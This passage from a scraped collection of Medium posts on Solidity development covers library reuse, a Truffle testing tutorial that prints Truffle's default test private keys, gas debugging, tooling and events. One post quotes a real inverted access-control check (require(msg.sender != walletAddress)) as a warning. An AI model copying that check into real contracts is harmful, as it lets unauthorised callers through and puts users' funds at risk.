FLOC\uff08\u30d5\u30ed\u30c3\u30af\uff09\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u5927\u5b66\u6821\uff5c\u4e16\u754c\u3092\u5909\u3048\u308b\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3092\u5b66\u3073\u3001\u672a\u6765\u3092\u5275\u308b\u4ed5\u4e8b\u3092\u3059\u308b\u6700\u901f3\u30f5\u6708\u3067\u5b9f\u8df5\u7684\u306a\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u6280\u8853\u3092\u7fd2\u5f97\u3057\u3001\u30b3\u30fc\u30b9\u7d42\u4e86\u6642\u306b\u53d7\u3051\u308b\u30b9\u30ad\u30eb\u30c1\u30a7\u30c3\u30af\u3092\u3082\u3068\u306b\u3001\u6280\u8853\u8005\u3092\u5fc5\u8981\u3068\u3057\u3066\u3044\u308b\u4f01\u696d\u3068\u306e\u4eba\u6750\u30de\u30c3\u30c1\u30f3\u30b0\u3092\u884c\u3044\u307e\u3059\u3002www.tcs-asp.net\u51fa\u5178\uff1a[FLOC\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u5927\u5b66\u6821]FLOC\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u5927\u5b66\u6821\u3067\u306f\u6700\u901f3\u30f5\u6708\u3067\u5b9f\u8df5\u7684\u306a\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u6280\u8853\u3092\u7fd2\u5f97\u3057\u3001\u30b3\u30fc\u30b9\u7d42\u4e86\u6642\u306b\u53d7\u3051\u3089\u308c\u308bCDLT\uff08Certification for Distributed Ledger Technology\uff09\u306b\u3088\u308b\u30b9\u30b3\u30a2\u30ea\u30f3\u30b0\u3092\u3082\u3068\u306b\u3001\u6280\u8853\u8005\u3092\u5fc5\u8981\u3068\u3057\u3066\u3044\u308b\u4f01\u696d\u3068\u306e\u4eba\u6750\u30de\u30c3\u30c1\u30f3\u30b0\u3092\u884c\u3044\u307e\u3059\u3002\u51fa\u5178\uff1a[FLOC\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u5927\u5b66\u6821]]5\u3064\u306e\u30dd\u30a4\u30f3\u30c8(1)\u6700\u901f3\u30f5\u6708\u3067\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u6280\u8853\u3092\u7fd2\u5f97(2)\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u6280\u8853\u306e\u30b9\u30ad\u30eb\u30a2\u30c3\u30d7(3)\u6700\u5148\u7aef\u306e\u6280\u8853\u7fd2\u5f97\u3067\u30ad\u30e3\u30ea\u30a2\u30a2\u30c3\u30d7(4)\u5b9f\u7e3e\u306e\u3042\u308b\u30a8\u30f3\u30b8\u30cb\u30a2\u304b\u3089\u76f4\u63a5\u5b66\u3079\u308b(5)\u72ec\u81ea\u306e\u30b9\u30ad\u30eb\u30c1\u30a7\u30c3\u30af\u5236\u5ea6\u30a8\u30f3\u30b8\u30cb\u30a2\u3001 \u8d77\u696d\u5bb6\u30fb\u4f1a\u793e\u54e1\uff08\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3092\u6d3b\u7528\u3057\u305f\u81ea\u793e\u30b5\u30fc\u30d3\u30b9\u306e\u63d0\u6848\u3092\u884c\u3044\u305f\u3044\u4eba\uff09\u7537\u5973\u554f\u308f\u305a\u5fdc\u52df\u304c\u53ef\u80fd\u3067\u3059\u3002\u51fa\u5178\uff1a[FLOC\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u5927\u5b66\u6821]Twitter\u306f\u3053\u3061\u3089\u2192@sato__yusuke\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3\u3084CoinTip\u3067\u300c\u6295\u3052\u92ad\u300d\u3092\u3057\u3066\u3044\u305f\u3060\u3051\u308b\u3068\u559c\u3073\u307e\u3059\u3002\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3\u3067\u5bc4\u4ed8\u3057\u305f\u3044\u91d1\u984d\u3092\u9078\u3093\u3067\u304f\u3060\u3055\u3044\u3002\u2192 \u3010\u3053\u3061\u3089\u3092\u30af\u30ea\u30c3\u30af\u3011IndieSquare Wallet\u3092\u30b9\u30de\u30db\u306b\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3057\u3001\u4e8b\u524d\u306b\u5bc4\u4ed8\u3057\u305f\u3044\u91d1\u984d\u4ee5\u4e0a\u306e\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3\u3092IndieSquare Wallet\u306b\u30c1\u30e3\u30fc\u30b8\u3057\u3066\u304a\u304f\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u51fa\u5178\uff1aCoin Tip\u3010\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3\u3011\u3092Twitter\u3067\u9001\u308b\u30b5\u30fc\u30d3\u30b9CoinTip", "responses": ""}, {"title": "Exploring Code Reuse in\u00a0Solidity", "author_name": "ConsenSys", "link": "https://media.consensys.net/exploring-code-reuse-in-solidity-6971e76dc247?source=search_post", "post_date": "Jun 8, 2016", "readtime": "5 min read", "upvotes": "30", "content": "Exploring Code Reuse in\u00a0SolidityConsenSysBlockedUnblockFollowFollowingJun 8, 2016My first impression of Solidity, the most popular programming language that runs on Ethereum\u2019s virtual machine, was that the language was quite approachable. As someone who has been working with languages like Ruby, JavaScript, Perl, and Java for 16 years, I was able read it immediately and started writing some basic smart contracts within a few days.I\u2019ve been around long enough to witness several programming language ecosystems mature. Code reuse tends to be at the center of this maturity, as the community builds increasingly powerful code libraries and frameworks on top of previous work. Perl has CPAN, Ruby has RubyGems, and Javascript has npm. It\u2019s clear that code reuse in the Solidity ecosystem is still in its infancy.Recognizing this void, my first month at ConsenSys I focused on filling it. I\u2019m assuming that Solidity will follow in the footsteps of its modern predecessors and benefit significantly from the distribution of foundational libraries and frameworks. I started with an exploration into where Solidity reuse is already underway.There\u2019s a precursor to a Solidity Standard Library that already ships with the language (source). These contracts allow developers to inherit from owned and mortal without having to reinvent these common smart contract patterns.There is a smattering of reusable libraries and contracts on Github, which developers can copy into their projects and deploy alongside their custom contracts. dapp-bin, Density, solidity-stringutils, and Standard Contracts are examples.On the topic of Github, it\u2019s possible to import code directly from Github in ethereum.github.io/browser-solidity like this: import \u201cgithub.com/ethereum/dapp-bin/library/iterable_mapping.sol\u201d;And if you want to pull in code from Github when compiling via solc on the command line, that\u2019s explained here.The people behind Dapple have created the dapphub-registry of contracts, which can be imported into Dapple projects. This is an ambitious project and includes storing source code via IPFS. The home page (under construction) is at dapphub.io.After speaking with friends and colleagues at ConsenSys and in the Ethereum community, I was convinced that facilitating code reuse in Solidity was a worthy project. I fully anticipate that other reuse-related projects will be on the rise this year, and I look forward to lots of collaboration.Being new to Ethereum, my instincts led me to focus on the smallest possible unit of reuse: the humble Solidity library. In Solidity, a library is a collection of functions that do not maintain any inherent state. Libraries are meant to be imported into a contract\u2019s bytecode, rather than provided to a contract via a constructor or a method call.Let\u2019s look at an example of a contract using a library:library Math {   function add(uint a, uint b) constant returns(uint) {       return a + b;   }}contract Example {   uint public c;function grow(uint d) {       c = Math.add(d, 2*c);   }}This syntax is straightforward. Math 's functions are called directly rather than through an instance of Math . If we were in Java, this would be a static method. In Ruby, a class method.Deploying this is a little less straightforward. First, you must compile and deploy Math, storing its address. Then we must compile Example and link Math's address into Example's bytecode. Thankfully solc does this for us via the --libraries  and --links flags (docs).As I learned the basics of how libraries work, it struck me that reusing Solidity libraries (and possibly contracts) could be quite different than reusing code in other languages. Once a Solidity library is deployed to the blockchain, it can be used by anyone, assuming you know its address and ABI. It occurred to me that a good first step toward spreading reuse in Solidity could be to provide a registry that mapped library names to the data needed to compile and link to those libraries, specifically their addresses and ABIs.Thus, the Live Libs project was born. Live Libs is a command line and JavaScript interface to a smart contract which stores a registry of libraries. Live Libs provides all the data you need in order to reuse a registered library, including the generated source code to compile against. Let's take that example again, but this time, instead of writing Math  ourselves, we'll use Live Libs to get a registered version of Math.import \"Math\";contract Example {   uint public c;function grow(uint d) {       c = Math.add(d, 2*c);   }}Looks simple, right? Well, it's not.That import \"Math\"  has a big question mark behind it. Another current area of active development in Solidity is how to hook into the import process in order to resolve these statements dynamically.Let's assume that someone has written a JavaScript wrapper around solc to intercept that import \"Math\"  and delegate the definition to Live Libs. Behind the scenes, you would call var libInfo = liveLibs.get(\"Math\") , which would provide you with two key items: libInfo.address  and libInfo.abstractSource() . You would provide the address, along with \"Math\"  to the compiler via --libraries --link , in order to tell Example  where Math  lives on the blockchain. But first, you would provide the generated abstract source code to the compiler so that Example would compile. Live Libs generates this code from the ABI that was stored when Math was registered. To be clear, that generated source is an abstract library:library Math {   function add(uint a, uint b) constant returns(uint);}The above example demonstrates the core of what Live Libs is trying to accomplish technically.The project is premised on the assumption that the Ethereum developer community is open to this style of reuse. Live Libs aims to keep common code from being unnecessarily duplicated on the blockchain. Most developers are accustomed to downloading modules to their local environments and then uploading those modules to private servers, effectively copying common modules (like Math ) thousands of times over. Developers who use the public Ethereum blockchain are all deploying to the same \"world computer\" running on the same virtual machine. These deployments have direct costs (spending Ether on gas), so there's incentive to keep deployments lean. Ethereum\u2019s unique characteristics thus present us with some unique opportunities.If you have thoughts or reactions to this post, please start conversations via issues!The Live Libs project is exploring:Building out a website to expose library information, blockchain events, documentation, and support testing. (project)Whether the Ethereum community would fund library development via Vitalik\u2019s article ransom (see 2:30) technique. The first version of this is documented here.Storing libraries that are written in Serpent in Live Libs.How this approach is affected by a sharded blockchain.", "responses": ""}, {"title": "Solidity CRUD Tutorial, Part 2\u200a\u2014\u200aTesting Your Smart Contract with\u00a0Truffle", "author_name": "Gaurav Agrawal", "link": "https://medium.com/crowdbotics/solidity-crud-tutorial-part-2-testing-your-smart-contract-with-truffle-3866f3ce2c66?source=search_post", "post_date": "Oct 9, 2018", "readtime": "5 min read", "upvotes": "26", "content": "Solidity CRUD Tutorial, Part 2\u200a\u2014\u200aTesting Your Smart Contract with\u00a0TruffleTesting a Solidity smart contract using Truffle frameworkGaurav AgrawalBlockedUnblockFollowFollowingOct 9, 2018In the last tutorial, we have created a smart contract which performs some basic CRUD (create, read, update, delete) operation, let\u2019s test that smart contract using Truffle.Truffle\u200a\u2014\u200aTruffle is the most popular development and testing framework for developing ethereum smart contracts.Installing TrufflePrerequisitesNodeJSNode Package Manager (NPM)InstallationFirst, we need to install the Truffle packagesudo npm install -g truffleVerify that it has been downloaded successfully by runningtruffleChoose a directory and runtruffle initIt will create a directory structure and create few files.Let\u2019s go to these directories one by one an will understand what they are.contracts/: Directory for Solidity contractsmigrations/: Directory for scriptable deployment filestest/: Directory for test files for testing your application and contractstruffle.js: Truffle configuration fileWe will use truffle develop to test our smart contract. Truffle gives us inbuilt development blockchain with ethereum accounts.Let\u2019s create a file with CrudApp.sol (Notice, same name as our contract name) under contracts directory and paste our smart contract code.Let\u2019s compile our smart contract using,truffle compileIt may show some warnings but let\u2019s ignore them for now. Open our development console using,truffle developIt will show an output something like below:Truffle Develop started at http://127.0.0.1:9545/Accounts:(0) 0x627306090abab3a6e1400e9345bc60c78a8bef57(1) 0xf17f52151ebef6c7334fad080c5704d77216b732(2) 0xc5fdf4076b8f3a5357c5e395ab970b5b54098fef(3) 0x821aea9a577a9b44299b9c15c88cf3087f3b5544(4) 0x0d1d4e623d10f9fba5db95830f7d3839406c6af2(5) 0x2932b7a2355d6fecc4b5c0b6bd44cc31df247a2e(6) 0x2191ef87e392377ec08e7c08eb105ef5448eced5(7) 0x0f4f2ac550a1b4e2280d04c21cea7ebd822934b5(8) 0x6330a553fc93768f612722bb8c2ec78ac90b3bbc(9) 0x5aeda56215b167893e80b4fe645ba6d5bab767dePrivate Keys:(0) c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3(1) ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f(2) 0dbbe8e4ae425a6d2687f1a7e3ba17bc98c673636790f1b8ad91193c05875ef1(3) c88b703fb08cbea894b6aeff5a544fb92e78a18e19814cd85da83b71f772aa6c(4) 388c684f0ba1ef5017716adb5d21a053ea8e90277d0868337519f97bede61418(5) 659cbb0e2411a44db63778987b1e22153c086a95eb6b18bdf89de078917abc63(6) 82d052c865f5763aad42add438569276c00d3d88a2d062d36b2bae914d58b8c8(7) aa3680d5d48a8283413f7a108367c7299ca73f553735860a87b08f39395618b7(8) 0f62d96d6675f32685bbdb8ac13cda7c23436f63efbb9d07700d8669ff12b7c4(9) 8d5366123cb560bb606379f90a0bfd4769eecc0557f1b362dcae9012b548b1e5Mnemonic: candy maple cake sugar pudding cream honey rich smooth crumble sweet treat\u26a0\ufe0f  Important \u26a0\ufe0f  : This mnemonic was created for you by Truffle. It is not secure.Ensure you do not use it on production blockchains, or else you risk losing funds.truffle(develop)>Your accounts and private keys will be different than mine.Now we have accounts ready and our development blockchain spun up, we can test our smart contract.Before that, let\u2019s run few commands and test the balance of our accounts. Replace my account number with your account in the command below.web3.eth.getBalance(\u201c0x627306090abab3a6e1400e9345bc60c78a8bef57\u201d)Result - BigNumber { s: 1, e: 20, c: [ 1000000 ] }As you can see, above command gives result in BigNumber. You need to convert that into number format using\u00a0.toNumber() function.web3.eth.getBalance(\"0x627306090abab3a6e1400e9345bc60c78a8bef57\").toNumber()Result -  100000000000000000000This shows balance in WEI (smallest ethereum unit / 1 ethereum = 1\u2070\u00b9\u2078 wei). To convert this into the ether, you need to use web3.fromWei() function.web3.fromWei(web3.eth.getBalance(\u201c0x627306090abab3a6e1400e9345bc60c78a8bef57\u201d).toNumber())Result - '100' <<< Number of ethereum on the test account Image sourceNow, we need to deploy our smart contract.You can use either deploy command or migrate command. You don\u2019t need to prefix truffle with commands on truffle CLI.deploy or migrate You can use reset flag (\u200a\u2014\u200areset) while redeploying your contracts to get the initial state of the blockchain.Test Cases-Now let\u2019s write some test cases to test our smart contract.Create a file CrudApp.js (name should be same as smart contract file) under test directory and copy below code.const CrudApp = artifacts.require('./CrudApp.sol')const assert = require('assert')let crudInstance;contract('CrudApp' , (accounts)  => { beforeEach(async () => {  crudInstance = await CrudApp.deployed() })it('should insert new user' , async() => {  await crudInstance.insert(\"USA\" , \"Trump\", 30000000);const country = await crudInstance.getCountry(\"USA\");  assert.equal(country[0] , \"USA\");  assert.equal(country[1] , \"Trump\");  assert.equal(country[2].toNumber() , 30000000);await crudInstance.updateLeader(\"USA\" , \"Hillary\");const country1 = await crudInstance.getCountry(\"USA\");  assert.equal(country1[0] , \"USA\");  assert.equal(country1[1] , \"Hillary\");  assert.equal(country1[2].toNumber() , 30000000);await crudInstance.deleteCountry(\"USA\");const total = await crudInstance.getTotalCountries();  assert.equal(total , 0); })})Let\u2019s walk through our code and understand it.We imported our contract and assert library, which created an instance of our contract after deploying it (CrudApp.deployed()). Then we simply wrote three test case in which we are testing all four operations.First, we are inserting a record and then updating and deleting it, respectively.You can write test cases in Solidity too, but we choose Javascript, as Truffle makes it easy to test our contract.You can also run few commands directly on Truffle console and also interact with our smart contract using Truffle CLI (Command Line Interface).truffle(develop)>  Above is what we calling Truffle CLI. Running commands on truffle.  Let\u2019s get an instance of our smart contract using this command.CrudApp.deployed().then(function(instance) { crud = instance;})This will give us an instance (crud) of our smart contract, let\u2019s play with it. This instance is simple ABI (Application Binary Unterface) you can check it just printing crud.ABI is the interface between two program modules, one of which is often at the level of machine code. The interface is the de facto method for encoding/decoding data into/out of the machine\u00a0code.Let\u2019s check the total number of countries by running this command.crud.getTotalCountries().then(function(num){var str= num.toString(); console.log(str)});Let insert a new countrycrud.insert(\"USA\",\"Trump\",30000000);The result should be something like this.{ tx: '0x6502bd013b41f246e31f071690ffb1c8f41d21c4cddbad8bb99bf53d9ac6c982',  receipt:    { transactionHash: '0x6502bd013b41f246e31f071690ffb1c8f41d21c4cddbad8bb99bf53d9ac6c982',     transactionIndex: 0,     blockHash: '0x297ed89cf22d78956e019100fd15ece49882124ba6d23476c4e48914d3da35f3',     blockNumber: 42,     gasUsed: 129230,     cumulativeGasUsed: 129230,     contractAddress: null,     logs: [ [Object] ],     status: '0x01',     logsBloom: '0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000008000000000000000000000002000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000' },  logs:    [ { logIndex: 0,       transactionIndex: 0,       transactionHash: '0x6502bd013b41f246e31f071690ffb1c8f41d21c4cddbad8bb99bf53d9ac6c982',       blockHash: '0x297ed89cf22d78956e019100fd15ece49882124ba6d23476c4e48914d3da35f3',       blockNumber: 42,       address: '0x8f0483125fcb9aaaefa9209d8e9d7b9c8b9fb90f',       type: 'mined',       event: 'CountryEvent',       args: [Object] } ] }This is transaction receipt you can see that our country event gets fired too. Whenever you change blockchain state, it has to be a transaction and transactions consume gas.Now let\u2019s check our entry by running this commandcrud.getCountry(\"USA\");You should see a result something like this.[ 'USA', 'Trump', BigNumber { s: 1, e: 7, c: [ 30000000 ] } ]You\u2019ve now learned how to interact with smart contract, and how to test it!Show me what you\u2019ve built in the comment section.ConclusionWe have learned how to do basic CRUD operations using solidity and test our smart contract. We cut down on details which can be overwhelming for the sake of brevity. Solidity and Truffle have extensive documentation and you should read them. Also, we used web3.js which comes with Truffle bundle.There are multiple ways to optimize our CRUD operations (Hint\u00a0: you can use an external array). Optimize it and let us know.It\u2019s time for some \ud83d\udc4f.", "responses": "1"}, {"title": "Indexing Your Solidity Smart Contracts", "author_name": "BlockApps", "link": "https://medium.com/@blockapps/indexing-your-solidity-smart-contracts-fc72880776e2?source=search_post", "post_date": "Aug 2, 2017", "readtime": "3 min read", "upvotes": "8", "content": "Indexing Your Solidity Smart ContractsBlockAppsBlockedUnblockFollowFollowingAug 2, 2017We\u2019ve now integrated the dashboard with our Smart Contract reporting engine Cirrus. Managing lots of contract states can become tedious as the number of smart contracts you\u2019ve deployed grows. With cirrus we expose a RESTful API that allows you to search through your smart contracts with simple query parameters.To try out this new feature set up a local installation with our developer trial, or spin up an instance on AzureNext create a new user.Then navigate to the contracts tab and create a smart contract.For this example I\u2019ll be using the trusty SimpleStorage.sol smart contractWhen uploading the contract you will notice you have an option to make the contract searchable. Under the hood what this means is that Cirrus will watch for instances of this contract being deployed and index their state.Let\u2019s go ahead and upload 3 instances of this contract. You should now see a screen that looks something like this.3 SimpleStorage.sol Smart Contracts have been\u00a0uploadedIf you click on an instance of your smart contract, you can call its methods straight from the UI. I\u2019m going to set my storage contracts to have values of 1, 10 & 100 respectively.Call smart contract methods from the dashboard UINow let\u2019s navigate to the query builder and search for SimpleStorage contracts with the value set to 10 or greater. To do this simply select the field and the type of comparison operator you would like to use. In this case I\u2019m using storedData which is the name of the storage variable in my simple storage contract and less than or equal to 10Once you\u2019ve fired off the query you can see that query URL used to fetch the data, http://localhost/cirrus/search/SimpleStorage?storedData=gte.10It\u2019s that simple. Under the hood this endpoint uses PostgREST to generate the API. Anything PostgREST supports you can use here. Give the tool a try and let us know what you think!", "responses": "1"}, {"title": "Our Blockchan Architect teaches \u201cEthereum & Solidity\u201d during Blockchain Delhi", "author_name": "Nolvia Serrano", "link": "https://medium.com/aave/our-blockchan-architect-teaches-about-ethereum-solidity-during-blockchain-delhi-aa4500eea47e?source=search_post", "post_date": "Apr 16, 2018", "readtime": "2 min read", "upvotes": "152", "content": "Our Blockchan Architect teaches \u201cEthereum & Solidity\u201d during Blockchain DelhiNolvia SerranoBlockedUnblockFollowFollowingApr 16, 2018Sharing Knowledge | On April 12, our Blockchain Architect, Jitendra Chittoda was invited to give a session on \u201cIntroduction to Ethereum & Solidity\u201d during Blockchain Delhi Conference\u00a0. Jitendra was excited to share knowledge with blockchain enthusiasts and thrilled to meet with ETHLend supporters from the local area.Blockchain Delhi Conference brought together the experts in the field of cryptocurrency and blockchain technology. Top industry professionals and specialists joined to interact with attendees and present their thoughts and knowledge on the concepts of the latest buzzword, Blockchain.Developers community from Delhi and nearby areas participated in the conference and were enthusiastic of learning about this technology and decentralized applications. Participants were ranging from students to experienced professionals.Blockchain DelhiBlockchain Delhi Conference is organized by C# Corner & Stratis platform. Every year C# Corner hosts the developer conference in Delhi partnering with Stratis platform. C# Corner has over a million developers registered with them.", "responses": ""}, {"title": "Solidity Lesson: Don\u2019t be like\u00a0this", "author_name": "Sittiphol Phanvilai", "link": "https://medium.com/@nuuneoi/solidity-lesson-dont-be-like-this-e82b6eed6caf?source=search_post", "post_date": "Jun 15, 2018", "readtime": "", "upvotes": "25", "content": "Solidity Lesson: Don\u2019t be like\u00a0thisSittiphol PhanvilaiBlockedUnblockFollowFollowingJun 15, 2018Ethereum Smart Contract source code is always visible to the public so whenever there is a bug on it, it is pretty hard to limit the damage, for example,\u00a0\u2026modifier onlyFromWallet {  require(msg.sender != walletAddress);  _;}This is not a joke but literally from a real case. Really sorry for those who got affected from that\u00a0!= operator. I will not mention the name but well\u00a0\u2026 what that just happened is just super awful.", "responses": ""}, {"title": "Solidity: A quick and dirty way to debug gas\u00a0usage", "author_name": "Dave Sumter", "link": "https://medium.com/@davesumter/solidity-a-quick-and-dirty-way-to-debug-gas-usage-962a1d8a4e?source=search_post", "post_date": "Jan 24, 2018", "readtime": "2 min read", "upvotes": "20", "content": "Solidity: A quick and dirty way to debug gas\u00a0usageDave SumterBlockedUnblockFollowFollowingJan 24, 2018I just wanted to share a technique I\u2019ve been using to measure gas usage in calls. As the title says, it\u2019s quick and dirty, but is really easy to use. This is obviously only used for debugging and must be removed in your production code. Here goes:1) add this event:event Gas(uint step, uint num);2) add this to the top of your function// GAS DEBUGGING \u2014 REMOVE IN PRODUCTION uint p; uint g = msg.gas;3) add this after each step in your code (increment the step number if you want)// GAS DEBUGGING p = msg.gas; Gas(1, g-p-7); g = msg.gas; \u2026 // GAS DEBUGGINGp = msg.gas; Gas(2, g-p-7); g = msg.gas;A note on what\u2019s happening here:we\u2019re creating an event that just logs a step number and a gas number.we set up some variables to hold the gas remaining amount at the start and end of each step.we take readings between each step and fire the event.you need to take the readings before and after the event otherwise they won\u2019t be accurate (the event and readings themselves use gas).7 seems to be the gas used in taking the readings currently, so this compensates for them (if you get a large reading eg. 2354\u2026.54736 then it has overflowed and 7 is too high)Please note this debugging will increase the total gas used in your calls while you are using it, so use it temporarily and then remove it. It\u2019s a great way to check packing is working, local assignments, etc.Here\u2019s a full working example:pragma solidity ^0.4.19;contract gas_test {    event Gas(uint step, uint num);        uint test_variable;        function test() public     {                 // GAS DEBUGGING        uint p; uint g = msg.gas;                         // GAS DEBUGGING        p = msg.gas; Gas(1, g-p-7); g = msg.gas;                test_variable = 1;                     // +- 20k gas                // GAS DEBUGGING        p = msg.gas; Gas(2, g-p-7); g = msg.gas;                var local_variable = test_variable;    // +- 200 gas                // GAS DEBUGGING        p = msg.gas; Gas(3, g-p-7); g = msg.gas;            }}", "responses": ""}, {"title": "Live Coding Solidity in\u00a0Unity", "author_name": "Jason Kende", "link": "https://medium.com/@kende/live-coding-solidity-in-unity-c819510c110c?source=search_post", "post_date": "Aug 29, 2017", "readtime": "4 min read", "upvotes": "34", "content": "Live Coding Solidity in\u00a0UnityJason KendeBlockedUnblockFollowFollowingAug 29, 2017A 26 week livestreaming project.If you were plopped back in 1992 and told in the next 25 years that every industry on earth, along with the way 7 billion people live will change entirely, what would you do?Would you learn how to master the technologies that will come to eat and run the world?Blockchain is the future of how we store, validate, and distribute information. It\u2019s how we bring the power of the internet into the programming of money. And it\u2019s not going to take 25 years. It\u2019s here today.Wait, we\u2019re building what??A live programming environment for blockchain development in 3d & VR. Made with Unity, used to learn and code Solidity, in a fully visual space.We decided the future we were promised can\u2019t wait any longer. So we\u2019re doing what any self respecting xennial & millennial duo would: Building it ourselves, live, on the internet.Maybe we\u2019re crazy enough to believe this will actually work, and maybe we just think this is a great way to gain deeper mastery of multiple skills at once.Why are we studying Unity?The hardest part of blockchain and cryptocurrency development is how few people understand it. It\u2019s abstract as fuck.Unity is the industry leading physics engine for game, film, VR, and mobile application development. They even have an open source project for creating VR experiences from within VR!We needed a tool that could make complex things simple to understand, in a digital visual space.For us, the choice was easy.And why are we doing it live?Maybe it\u2019s a personality quirk. RGBubs & I both love to go into the hardest part of any puzzle, problem, or project first. Once that\u2019s solved, we know the rest will fall neatly into place.And in case you didn\u2019t know, livestreaming is huge.Lovers In A Dangerous SpacetimeBut why this hypervisual approach to code?It\u2019s the same impulse really. Identify the hardest thing the people you are trying to serve are experiencing and solve that with them first.Enough people understand now that blockchain, cryptocurrencies, and a confusing mix of other tech trends are really important, make a lot of money for the people who do things with them, and are becoming unavoidable. But how many understand what any of it means or how they actually do what they do?We\u2019re obsessed with live video, 3d immersive environments, and alternate digital realities using AR and VR inside of studio spaces filled with super specialized equipment, because we were the kids sitting inches from the screen playing our video games eyes glued to the action, no matter how many times we were told not to. We watch more Youtube than you want to know. And, most of all, because these are expensive tools that very few people have access to and it really only make sense to use them in specific situations.When a thing is super simple and already well understood by mainstream audiences, then stick to the most proven communication technology on the planet\u200a\u2014\u200abasic text and touchable images on a mobile screen. But when you need to understand a hyper complex new cluster of technologies that no one alive today can afford to ignore, we need to be able to see it, feel it, touch it, interact with it, and explore it to really get it.That\u2019s what we\u2019re here to do.", "responses": ""}, {"title": "Solidity Integration with Visual\u00a0Studio", "author_name": "ConsenSys", "link": "https://media.consensys.net/solidity-integration-with-visual-studio-7f25ea1bde71?source=search_post", "post_date": "Apr 1, 2016", "readtime": "6 min read", "upvotes": "4", "content": "Solidity Integration with Visual\u00a0StudioGetting Started with\u00a0SolidityConsenSysBlockedUnblockFollowFollowingApr 1, 2016On March 30, 2016 we proudly announced the integration of Solidity and the Smart Contracts that work with Ethereum blockchains into Visual Studio. This exists as an extension that is available here. This extension was designed to lower the bar to working with blockchains and make this a seemless process from inside the world class IDE.The extension is free, and we have put together some steps to further help you get started using this.PrerequisitesTo get started you will need to be using Visual Studio 2015 Community, Professional, or Enterprise edition. You will also need to download the Solidity extension from the Visual Studio Marketplace. You can download that here. After installing the extension, you will need to restart Visual Studio. Also, nodejs will need to be installed to allow local deployments for development. This can be downloaded here. (download the latest LTS version)Create your first Decentralized ApplicationAfter the extension has been installed, next you can create a decentralized application that will be used to author, compile and deploy smart contracts.From the File menu, click new Project.2. In the New Project dialog box, click on Solidity under Installed Templates, and then select DecentralizedApplication. Name the application, MyDecentralizedApp, and then click OK.3. Next you will see a few things happened. A README document was opened in the Visual Studio main window and the project was setup with some folder and sample files. The README explains how to setup a local keyserver in order to deploy smart contracts to a development blockchain instance.a. First download and install the latest version of bloc from Consensys. To do this, open a cmd prompt, navigate to a directly where you would like to install the keyserver and run the following command: npm install blockapps-blocb. Next create the instance of bloc from the core by running the command:bloc init. This will prompt you for some values that will be used the instance. Enter a name of your choice, and user name, and accept the default for the apiUrl. This is the ethereum node that will hold the actual blocks that your account/contracts will be deployed to.c. Now change to that directory and install the required node packages by running the following command: cd <appname> && npm installd. Finally you are ready to start the bloc instance by running the following command: bloc start4. Now we have a keyserver running. This local keyserver will run on port 8000 by default. The Visual Studio extension is configured to use this server by default, with a user named: testuser and a password: testing. You can view and edit these changes by running the following:a. Right click the project in solution explorer.b. The dialog here shows the configuration values that are set by default, and can be adjusted if needed. (they will not need to be adjusted in most cases)5. At this point we have a keyserver running locally, now we have an endpoint that we can deploy our smart contracts to (as well as create new users). So now we can get started with development of smart contracts.Working with Smart Contracts (authoring, compiling, deploying)Now that the foundation is place, we can take a look at working with Smart Contracts. By default a folder named samples will be created with some sample contracts already included. When you are just getting started with Solidity, these are a great source of reference.To get started, we can use the Payout.sol smart contract. First, we can examine the contract in the Visual Studio code window. When we are satisified with what we have authored, we can then compile this contract. This compiliation will take place on the local machine. The output from the compliation will be in the output window of Visual Studio,Compilation1. Compile the smart contract2. The output for the compilation is found in the output window. If you don\u2019t see the output window in the lower part of your screen you can open from the View -> Output menu (or Ctrl + W, O). If there any errors with the compilation, it will be shown in the output window as well.DeploymentThe deployment is nearly as simple as the compilation. The deployment will send the smart contract to your local keyserver which will communicate with the underlying blockchain. What is actually happening is this.1. First, VS will use the project properties (shown earlier) to determine the bloc server to communicate with (url).2. Next VS will call this server, asking if the user in the project properties, exists.a. If it does exist, the address of the user will be returned to Visual Studio.b. If it doesn\u2019t exist, a new user will be created, and that address will be returned to Visual Studio.3. Next, VS will get the source for the contract, along with the address of the user and post this to the bloc server.4. Finally, your default browser will be opened to a dynamically created html page of the smart contract that was deployed.5. When the browser opens, you can enter the password for the bloc server (default is testing).6. You can then exercise the contract. For example, you can send in a value in Ether by post 1 to the setup box.Next StepsAt this point, congratulations, you have now entered the blockchain universe! I will be posting some more tutorials to expand on this.Written by Cale Teeter, Senior Software Engineer, DX, Microsoft", "responses": "2"}, {"title": "Hackathon Challenge: Build a Compiler for A Structured Data Definition Language for\u00a0Solidity", "author_name": "Daniel Wang", "link": "https://medium.com/loopring-protocol/hackathon-challenge-build-a-compiler-for-a-structured-data-definition-language-for-solidity-fe50fefa3f96?source=search_post", "post_date": "Sep 4, 2018", "readtime": "4 min read", "upvotes": "23", "content": "Hackathon Challenge: Build a Compiler for A Structured Data Definition Language for\u00a0SolidityDaniel WangBlockedUnblockFollowFollowingSep 4, 2018Loopring is sponsoring CryptoBazar\u2019s upcoming September hackathon, and here is our Hackathon challenge: design a solidity struct definition language and build a compiler for it to help solidity-based smart contract to serialize and deserialize 